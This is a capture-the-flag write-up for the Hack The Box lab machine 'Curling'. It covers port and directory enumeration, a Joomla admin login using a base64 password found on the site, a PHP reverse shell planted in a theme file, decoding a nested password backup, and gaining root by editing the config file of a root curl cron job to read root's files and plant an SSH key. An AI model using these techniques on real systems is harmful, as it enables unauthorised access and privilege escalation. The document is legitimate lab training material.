# Curling Writeup

Oh boy, curling. This is the first box that I failed to get root on :(. On the bright side, I've learned a lot from others' writeups on this box.

This writeup will still include how I rooted the box, given additional information from other writeups. I still rooted the box in the end, for the educational value.

> I should also start taking screenshots when I'm working through these boxes. When I was writing this writeup, I found it difficult to demonstrate what I was seeing on webpage.

## Enumeration

### Nmap Scan

`nmap -sC -sV -sT 10.10.10.150`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 17:13 PDT
Nmap scan report for 10.10.10.150
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.50 seconds
```

No funky services here.

### Enumerating HTTP

`gobuster -u 10.10.10.150 -w /usr/share/dirb/wordlists/common.txt`

Curling:80/

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.150/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/04/11 17:15:29 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
=====================================================
2019/04/01 17:16:57 Finished
=====================================================
```

The actual website itself is some sort of fan-page dedicated to the sport of curling. There appears to be some sort of login panel as well.

The most interesting discovery from gobuster would appears to be `/adminisrator`, which when browsed to, reveals an administrative login portal. 

## Getting User

Using inspect element, there is a comment at the bottom of the page, 

```html 
<!-- secret.txt -->
```

Browsing to `10.10.10.150/secret.txt` gives us a cryptic string: `Q3VybBluZzIwMTgh`. After we base64 decode it, it gives us some sort of password.

```
Curling2018!
```

It seems like it would most likely be the password for the administrator panel found earlier. We still don't have a username however.

Looking through some of the blog posts, one of the posts is signed with a name; `Floris`. Upon trying this with the password we just found, we successfully login as an administrator.

### PHP reverse shell

On the site, the first thing that I notice is an images tab, where files can be uploaded. On the same tab are administrative options for allowing what kind of files to be uploaded. However, on attempting to upload a php reverse shell, I still get `File Type Not Allowed` error message. Looking through Joomla documentation, Joomla automatically detects php code on upload.

> Note: I'm using [pentest monkey's](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) php reverse shell

Looking deeper into the site, there is a themes panel where the appearance of the blog can be modified. Luckily, it appears that the themes are written in php. By writing over one of the theme files with the reverse shell's code and 'previewing' it, we get a shell back! However, we are logged in as user `www-data` and can't read `user.txt`, but there is another file that looks interesting: `password_backup`.

### Decrypting `password_backup`

`password_backup` is a heavily compressed file that contains the user password for `floris`. Reading it gives us some sort of hexdump:

```
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

Running `xxd -r password_backup` gives us another file which its output is that of a bzip file. This process of 'decrypting' goes on for a couple more iterations before we get our password.txt.

Full process

1. `xxd -r password_backup decrypted`
2. `bzip2 -d decrypted.bz2`
3. `gzip -d decrypted.gz`
4. `bzip2 -d decrypted.bz2`
5. `tar -xf decrypted.tar`
6. `cat password.txt`

Reading `password.txt` gives us an output of `5d<wdCbdZu)|hChXll` of file type ASCII Text: Looks like our user password.

Since ssh is open, sshing into the machine with `floris` and `5d<wdCbdZu)|hChXll` gives us a successful login. Navigating to the home directory, we can now read `user.txt`!

`65d...`

## Getting Root

There is another directory in `floris`'s home called `admin-area`.

```
admin-area
|-- input
|-- report
```
The file `input` contains `url = "http://127.0.0.1"`, while report contains the html of the homepage of the curling site. What I knew here was that there was some kind of process running `curl` on `input`, and spitting out `report`. This is where I didn't realize that `curl` works on local files.

I also verified that the process was running as root using [pspy](https://github.com/DominicBreuker/pspy), a handy tool for watching which processes write to what.

Command:
```
./pspy32s -d admin_area
```

Which gives us:

```
2019/04/01 22:24:27 CMD: UID=0    PID=1      | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

`input` simply just needs to be modified to:

```
url = "file:///root/root.txt"
```

Of course, that seems like a very underwhelming way of getting the root flag, especially since I didn't figure it out in time. What about a root shell?

### Getting a Root Shell

I really liked [Simon Lemire's](https://snowscan.io/htb-writeup-curling/) solution for getting a root shell.

By adding our ssh key to `/root/.ssh/authorized_keys`, you can login as root through ssh. Its as simple as hosting our ssh pubkey, and modifying `input` to fetch our key and add it to `authorized_keys`. A lot more satisfying than just reading `root.txt`!

`82c...`
